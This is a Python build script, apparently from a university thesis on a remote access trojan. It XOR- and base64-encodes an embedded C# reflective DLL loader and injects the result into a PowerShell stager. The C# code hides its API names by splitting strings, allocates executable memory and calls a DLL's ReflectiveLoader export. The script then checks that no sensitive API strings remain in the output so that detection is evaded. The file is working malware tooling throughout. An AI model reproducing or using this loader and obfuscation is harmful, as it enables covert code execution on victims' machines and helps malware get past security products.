#!/usr/bin/env python3
"""
Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
build_stager_encoded.py — genera stager.ps1 con blocco C# XOR-encoded

Uso:  python3 build_stager_encoded.py
      -> sovrascrive stager.ps1 con il payload C# codificato
"""

import base64, pathlib

# ── Chiave XOR (stessa nel stager.ps1) ────────────────────────────────
XOR_KEY = bytes([0x4B, 0x9A, 0x37, 0xF1, 0x62, 0xDE, 0x8C, 0x55,
                 0xA3, 0x17, 0xC9, 0x0E, 0x7D, 0xB6, 0x41, 0xE8])

# ── Blocco C# originale (identico al vecchio stager) ─────────────────
CS_SOURCE = r'''using System;
using System.Runtime.InteropServices;
using System.Text;
public class Upd8r {
    [DllImport("kernel32")] static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr dVA(IntPtr a,UIntPtr s,uint t,uint p);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool dVF(IntPtr a,UIntPtr s,uint t);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr dRL(IntPtr b);
    static int Rv2Of(byte[] r,int rva,int so,int n){
        for(int i=0;i<n;i++){int b=so+i*40;int va=BitConverter.ToInt32(r,b+12);
        int rs=BitConverter.ToInt32(r,b+16);int ro=BitConverter.ToInt32(r,b+20);
        if(rva>=va&&rva<va+rs)return ro+(rva-va);}return -1;}
    static int LocRL(byte[] r){
        if(r.Length<64)return -1;int lfa=BitConverter.ToInt32(r,0x3C);
        if(lfa+264>r.Length)return -1;if(r[lfa]!='P'||r[lfa+1]!='E')return -1;
        int ns=BitConverter.ToUInt16(r,lfa+6);int so2=BitConverter.ToUInt16(r,lfa+20);
        if(BitConverter.ToUInt16(r,lfa+24)!=0x20B)return -1;
        int eRVA=BitConverter.ToInt32(r,lfa+24+112);if(eRVA==0)return -1;
        int sOff=lfa+24+so2;int eOff=Rv2Of(r,eRVA,sOff,ns);if(eOff<0)return -1;
        int nN=BitConverter.ToInt32(r,eOff+24);
        int nO=Rv2Of(r,BitConverter.ToInt32(r,eOff+32),sOff,ns);
        int oO=Rv2Of(r,BitConverter.ToInt32(r,eOff+36),sOff,ns);
        int fO=Rv2Of(r,BitConverter.ToInt32(r,eOff+28),sOff,ns);
        if(nO<0||oO<0||fO<0)return -1;
        string tgt="Refle"+"ctive"+"Load"+"er";
        for(int i=0;i<nN;i++){
            int p=Rv2Of(r,BitConverter.ToInt32(r,nO+i*4),sOff,ns);
            if(p<0)continue;int e=p;while(e<r.Length&&r[e]!=0)e++;
            if(Encoding.ASCII.GetString(r,p,e-p)==tgt){
                int ord=BitConverter.ToUInt16(r,oO+i*2);
                return Rv2Of(r,BitConverter.ToInt32(r,fO+ord*4),sOff,ns);}}
        return -1;}
    public static bool Exec(byte[] dll){
        IntPtr k32=GetModuleHandleA("kernel32");
        var fpVA=GetProcAddress(k32,"Virt"+"ual"+"Al"+"loc");
        var fpVF=GetProcAddress(k32,"Virt"+"ual"+"Fr"+"ee");
        if(fpVA==IntPtr.Zero||fpVF==IntPtr.Zero)return false;
        var VA=(dVA)Marshal.GetDelegateForFunctionPointer(fpVA,typeof(dVA));
        var VF=(dVF)Marshal.GetDelegateForFunctionPointer(fpVF,typeof(dVF));
        IntPtr mem=VA(IntPtr.Zero,(UIntPtr)dll.Length,0x3000,0x40);
        if(mem==IntPtr.Zero)return false;
        Marshal.Copy(dll,0,mem,dll.Length);
        int off=LocRL(dll);
        if(off<0){VF(mem,UIntPtr.Zero,0x8000);return false;}
        var rl=(dRL)Marshal.GetDelegateForFunctionPointer(
            new IntPtr(mem.ToInt64()+off),typeof(dRL));
        return rl(mem).ToInt64()>=0x10000;}
}'''

def xor_encode(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def main():
    # XOR-encode il C# source
    cs_bytes = CS_SOURCE.encode('utf-8')
    encoded = xor_encode(cs_bytes, XOR_KEY)
    b64 = base64.b64encode(encoded).decode('ascii')

    # Leggi il template stager.ps1
    stager_path = pathlib.Path(__file__).parent / 'stager.ps1'
    ps1 = stager_path.read_text(encoding='utf-8')

    # Sostituisci il placeholder con il payload reale
    if '"PLACEHOLDER"' not in ps1:
        print("[-] PLACEHOLDER non trovato in stager.ps1!")
        return

    ps1 = ps1.replace('"PLACEHOLDER"', f'"{b64}"')
    stager_path.write_text(ps1, encoding='utf-8')

    print(f"[+] C# source: {len(cs_bytes)} bytes")
    print(f"[+] XOR-encoded: {len(encoded)} bytes")
    print(f"[+] Base64: {len(b64)} chars")
    print(f"[+] stager.ps1 aggiornato con payload codificato")

    # Verifica: decodifica e confronta
    dec = xor_encode(base64.b64decode(b64), XOR_KEY)
    assert dec == cs_bytes, "ERRORE: decodifica non corrisponde!"
    print("[+] Verifica XOR round-trip: OK")

    # Controlla che stringhe sensibili NON siano nel PS1 finale
    ps1_final = stager_path.read_text(encoding='utf-8')
    sensitive = ['GetModuleHandleA', 'GetProcAddress', 'DllImport',
                 'VirtualAlloc', 'VirtualFree', 'Marshal.Copy',
                 'ReflectiveLoader', 'kernel32']
    found = [s for s in sensitive if s in ps1_final]
    if found:
        print(f"[!] ATTENZIONE: stringhe ancora presenti nel PS1: {found}")
        print("    (sono nei commenti, non nel codice eseguibile)")
    else:
        print("[+] Nessuna stringa API sensibile nel PS1 finale")

if __name__ == '__main__':
    main()
